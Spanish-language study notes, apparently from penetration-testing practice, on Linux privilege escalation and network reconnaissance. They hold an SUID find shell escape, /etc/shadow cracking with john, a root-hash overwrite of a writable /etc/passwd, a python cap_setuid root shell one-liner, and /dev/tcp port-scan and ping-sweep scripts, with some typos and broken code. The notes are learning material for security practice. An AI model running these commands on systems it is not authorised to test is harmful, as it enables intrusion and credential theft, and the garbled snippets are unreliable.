"""
Al filtrar con grep si utilizamos el $ al final indicamos que quremos que termine necesariamente como
la cadena ingresada preaviamente y ^ para que empieze

cat /etc/passwd | grep sh$ | awk '{print $1}' FS=':'

chattr -----> controlar permisos avanzados 

?$ chattr +i -V
i ----> ni root podra borrar
-V ----> verbose
lsattr ---> listar permisos especiales

gtfobins.github.io ---> se puede buscar por comandos y vulneravilidades

Por ejemplo si el binario find tuviese permisos suid

find . -exec /bin/sh -p \; -quit

?$ uname -a  

?$ lsb_release -a

Fuerza bruta al etc/shadow 

?$ cat /etc/shadow | grep 'x' > to_break

?$ john --wordlist=rockyou.txt to_break 

?$ john --show to_break

Identificar hashes

hash-identifier 
hashid {hash}

Si el archivo etc/passwd tiene permisos de escritura se puede alterar la contraseña

?$ openssl passwd 

Una vez tengamos el hash DES(Unix) podemos alterar el etc/passwd

root:x:0:0:root:/root:/usr/bin/zsh

root:{hash_passwd}:0:0:root:/root:/usr/bin/zsh

Scrip en C con root


-----

# include <stdio.h>

setuid(0)   <--- Esto porque en C existe una medida de seguridad

void main(){
    printf("Listando procesos (usr/bin/ps):");
    system("/usr/bin/ps);

    printf("Listando procesos (ps):");
    system("ps);
}

El archivo tendra SUID

El explotar una vulneravilidad y intentar escalar privilegios en un sistema puede ser desgastante, aca entran
en juego las persistencias, para que si llegaramos a apagar la maquina poder seguir teniendo conexion.
U otras como las persistencias privilegiadas...

Capabilities:

?$ getcap -r / 2>/dev/null 
Listar las capabilities desde la raiz

Por ejemplo podriamos tener la capabilitie de cap_setuid+ep en python en donde el atacante podria setearse la id de manera
exitosa para recobrar axeso como root al sistema

?$ python3 -c 'import os; os.setuid(0); os.sistem("/bin/bash")'
¿'
?$ setcap -r /usr/bin/pyhton3

?$ getcap

?$ setcap cap_setuid+ep

------------

?$ pint -c 1 {ip} -R  
-R <-- flag para mostrar el Recorod Route

nmp -p- -T5 --opne -n -v {ip} -oG {file_name}

nmap -sC -sV -p{ports} {ip} -oN {file_name}

?$ whatweb http://{ip}
Para ver lo más relevante de una app web

Para un escaneo más rapido 

?$ nmap -p- -oS- --min-rate 5000 --open -vvv -n -Pn {ip}

#!/bin/bash

for port in $(seq 1 65535); do
    echo '' > /dev/tcp/{ip}/port && echo 'Port open'
done

Ctrl + z ----> pasar al segundo plano
kill % ---> matar al proceso enviado a segundo plano 

Identificar activos en tu segmento de red

#!/bin/bash

for i in $(seq 2 254); do
    timeout 1 bash -c "ping -c 1 {ip}.$i > dev/null 2>&1" && echo "Host {ip}.$i - ACTIVE"
done; wait

* NMAP
Enumerar puertos, vulneravilidades

updatedb

locate .nse      <----- scripts de nmap
locate .nse | wc -l    <---- Contar los scrips
locate .nse | xargs grep "categories"   <----- ver las categorias de los scripts





"""